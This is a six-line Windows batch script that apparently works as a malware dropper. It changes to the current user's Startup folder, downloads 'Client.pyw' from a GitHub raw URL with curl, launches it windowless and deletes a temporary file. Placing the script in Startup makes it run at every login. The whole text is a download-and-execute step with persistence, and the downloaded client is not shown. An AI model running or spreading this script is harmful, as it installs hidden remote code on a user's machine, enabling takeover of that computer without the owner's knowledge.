cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl -o Client.pyw https://raw.githubusercontent.com/imadeit445/client/main/Client.pyw
start Client.pyw
timeout 3 >null.txt
del null.txt
exit
